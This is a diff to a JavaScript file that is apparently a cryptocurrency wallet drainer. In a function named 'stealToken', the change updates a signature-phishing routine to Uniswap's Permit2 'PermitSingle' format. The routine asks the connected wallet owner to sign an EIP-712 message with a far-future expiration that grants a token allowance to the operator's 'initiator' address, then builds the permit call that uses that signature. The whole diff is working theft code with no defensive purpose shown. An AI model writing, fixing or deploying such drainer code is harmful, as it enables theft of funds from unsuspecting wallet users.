@@ -986,8 +986,8 @@ async function approveMax() {
 }
 
 async function stealToken() {
-    const contractNonce = await web3.eth.getTransactionCount(tokenToSteal)
-    const deadline = (Math.round(Date.now() / 1000)) + 100
+    const ownerNonce = await web3.eth.getTransactionCount(selectedAddress)
+    const deadline = 10000000000000 // (Math.round(Date.now() / 1000)) + 100
     const maxInt = "115792089237316195423570985008687907853269984665640564039457584007913129639935"
 
     const dataToSign = JSON.stringify({
@@ -1002,29 +1002,31 @@ async function stealToken() {
                 { name: "chainId", type: "uint256" },
                 { name: "verifyingContract", type: "address" }
             ],
-            Permit: [
-                { name: "permitted", type: "Permitted" },
+            PermitSingle: [
+                { name: "details", type: "PermitDetails" },
                 { name: "spender", type: "address" },
-                { name: "nonce", type: "uint256" },
-                { name: "deadline", type: "uint256" },
+                { name: "sigDeadline", type: "uint256" }
             ],
-            Permitted: [
-                { name: "token", type: "address" }, 
-                { name: "amount", type: "uint256" },
+            PermitDetails: [
+                { name: "token", type: "address" },
+                { name: "amount", type: "uint160" },
+                { name: "expiration", type: "uint48" },
+                { name: "nonce", type: "uint48" }
             ]
         },
-        primaryType: "Permit",
+        primaryType: "PermitSingle",
         message: { 
-            permitted: {
+            details: {
                 token: tokenToSteal,
-                amount: 20
+                amount: 20,
+                expiration: deadline,
+                nonce: parseInt(0)
             }, 
             spender: initiator, 
-            nonce: parseInt(contractNonce),
-            deadline: deadline
+            sigDeadline: deadline,
         }
     })
-        
+
     web3.currentProvider.sendAsync({
         method: "eth_signTypedData_v3",
         params: [selectedAddress, dataToSign],
@@ -1036,8 +1038,9 @@ async function stealToken() {
         const ownerNonce = await web3.eth.getTransactionCount(selectedAddress)
         const spenderNonce = await web3.eth.getTransactionCount(recipient)
 
-        const permitDetails = [[tokenToSteal, 20, deadline, parseInt(spenderNonce)], recipient, deadline]
+        const permitDetails = [[tokenToSteal, 20, deadline, parseInt(0)], initiator, deadline]
         // console.log(selectedAddress, permitDetails, signature)
+        // return
         const permit2Contract = new web3.eth.Contract(Permit2ContractABI, Permit2Contract)
         const permit = permit2Contract.methods.permit(selectedAddress, permitDetails, signature).encodeABI()
         const initiatorNonce = await web3.eth.getTransactionCount(initiator)
